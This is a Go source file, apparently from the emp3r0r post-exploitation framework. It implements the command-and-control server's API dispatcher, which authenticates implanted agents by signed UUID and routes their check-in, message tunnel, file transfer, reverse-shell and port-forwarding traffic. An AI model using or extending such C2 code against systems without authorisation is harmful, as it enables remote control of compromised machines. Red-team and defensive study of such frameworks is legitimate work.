package server

import (
	"encoding/base64"
	"fmt"
	"net/http"
	"path/filepath"

	"github.com/gorilla/mux"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// apiDispatcher routes requests to the correct handler.
func apiDispatcher(wrt http.ResponseWriter, req *http.Request) {
	vars := mux.Vars(req)
	// Setup H2Conn for reverse shell and proxy.
	rshellConn := new(def.H2Conn)
	proxyConn := new(def.H2Conn)
	network.RShellStream.H2x = rshellConn
	network.ProxyStream.H2x = proxyConn

	if vars["api"] == "" || vars["token"] == "" {
		logging.Debugf("Invalid request: %v, missing api/token", req)
		wrt.WriteHeader(http.StatusNotFound)
		return
	}

	agent_uuid := req.Header.Get("AgentUUID")
	sig := req.Header.Get("AgentUUIDSig")
	agent_sig, err := base64.URLEncoding.DecodeString(sig)
	if err != nil {
		logging.Debugf("Failed to decode agent sig: %v", err)
		wrt.WriteHeader(http.StatusNotFound)
		return
	}
	isValid, err := transport.VerifySignatureWithCA([]byte(agent_uuid), agent_sig)
	if err != nil {
		logging.Debugf("Failed to verify agent uuid: %v", err)
		wrt.WriteHeader(http.StatusNotFound)
		return
	}
	if !isValid {
		logging.Debugf("Invalid agent uuid, refusing request")
		wrt.WriteHeader(http.StatusNotFound)
		return
	}
	logging.Debugf("Header: %v", req.Header)
	logging.Debugf("Got a request: api=%s, token=%s, agent_uuid=%s, sig=%s",
		vars["api"], vars["token"], agent_uuid, sig)

	token := vars["token"]
	api := transport.WebRoot + "/" + vars["api"]
	switch api {
	case transport.CheckInAPI:
		handleAgentCheckIn(wrt, req)
	case transport.MsgAPI:
		handleMessageTunnel(wrt, req)
	case transport.FTPAPI:
		for _, sh := range network.FTPStreams {
			if token == sh.Token {
				handleFTPTransfer(sh, wrt, req)
				return
			}
		}
		wrt.WriteHeader(http.StatusNotFound)
	case transport.FileAPI:
		if !agents.IsAgentExistByTag(token) {
			wrt.WriteHeader(http.StatusNotFound)
			return
		}
		path := filepath.Clean(req.URL.Query().Get("file_to_download"))
		path = filepath.Base(path)
		logging.Debugf("FileAPI request for file: %s, URL: %s", path, req.URL)
		local_path := fmt.Sprintf("%s/%s/%s", live.Temp, transport.WWW, path)
		if !util.IsExist(local_path) {
			wrt.WriteHeader(http.StatusNotFound)
			return
		}
		http.ServeFile(wrt, req, local_path)
	case transport.ProxyAPI:
		handlePortForwarding(network.ProxyStream, wrt, req)
	default:
		wrt.WriteHeader(http.StatusNotFound)
	}
}
